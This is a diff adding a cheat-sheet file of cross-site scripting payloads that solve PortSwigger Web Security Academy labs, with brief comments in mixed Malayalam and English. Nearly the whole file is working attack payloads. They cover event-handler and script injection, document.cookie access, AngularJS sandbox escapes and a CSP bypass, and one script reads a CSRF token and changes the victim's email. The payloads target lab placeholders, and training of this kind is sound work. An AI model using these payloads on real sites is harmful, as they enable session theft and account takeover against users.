@@ -1,0 +1,95 @@
+all portswigger labs xss cheats/solutions :
+
+---->   <script>alert("1")</script>
+
+---->   "><svg onload=alert(1)>  "><svg onload=alert(document.cookie)>
+           dom based xss ahn idh  svg image 
+           format attacks
+
+---->   ><img src=x onerror=prompt(1)>  ---> <script> tag execute      
+                                        avathappom use Cheyne payload
+
+
+---->   href attributen lle payload :--> href=javascript:alert(1)
+
+---->   <img src=x onerror=prompt(1)>  , iframe src="https://urlabID.web-security-academy.net/#abcd" onload = "this.src = this.src + '<img src=x  
+        onerror=print(1)>'"
+        or try this :> <iframe src= "https://urlabID.web-security-academy.net/#" onload="this.src += '<img src=1 onerror=print()>' " hidden="hidden">    
+        </iframe>
+
+---->   "onmouseover="alert(1)
+
+---->   javascript:alert(1)
+
+---->   '-alert(1)-'
+
+---->   &storeId="></select><img%20src=1%20onerror=alert(1)>
+
+---->   {{$on.constructor('alert(1)')()}}
+
+---->   \"-alert(1)}//
+
+---->   <><img src=1 onerror=alert(1)>
+
+---->   <iframe src="https://urlabID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E"        
+        onload=this.style.width='100px'>
+
+---->   <script>
+        location='https://urlabID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1% 
+        3E#x';
+        </script>
+
+---->   https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+
+---->   https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) 
+
+---->   </script><script>alert(1)</script>
+
+---->  \'-alert(1)//
+
+---->   http://foo?&apos;-alert(1)-&apos;
+
+---->   ${alert(1)}
+
+---->   <script>
+        var req = new XMLHttpRequest();
+        req.onload = handleResponse;
+        req.open('get','/my-account',true);
+        req.send();
+        function handleResponse() {
+        var token = this.responseText.match(/name="csrf"       
+        value="(\w+)"/)[1];
+        var changeReq = new XMLHttpRequest();
+        changeReq.open('post', '/my-account/change-email', true);
+        changeReq.send('csrf='+token+'&email=test@test.com')
+        };
+        </script> 
+
+---->  https://YOUR-LAB-ID.web-security-academy.net/?search=1   
+       &toString().constructor.prototype.charAt%
+3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,10     
+       8,101,114,116,40,49,41)=1
+
+---->    <script>
+         location='https://YOUR-LAB-ID.web-security-academy.net/?  
+         search=%3Cinput%20id=x%20ng-focus= 
+         $event.composedPath()|orderBy:%27(z=alert)(document.cookie)%  
+         27%3E#x';
+         </script>
+
+---->   https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg% 
+       3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%
+       3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%   
+       3E%3C% 
+       2Fa%3E
+
+---->   https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%
+        27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b% 
+        27% 
+        27,{x:%27
+
+---->   https://YOUR-LAB-ID.web-security-academy.net/?search=%
+        3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%
+        20%27unsafe-inline%27
+
+ 
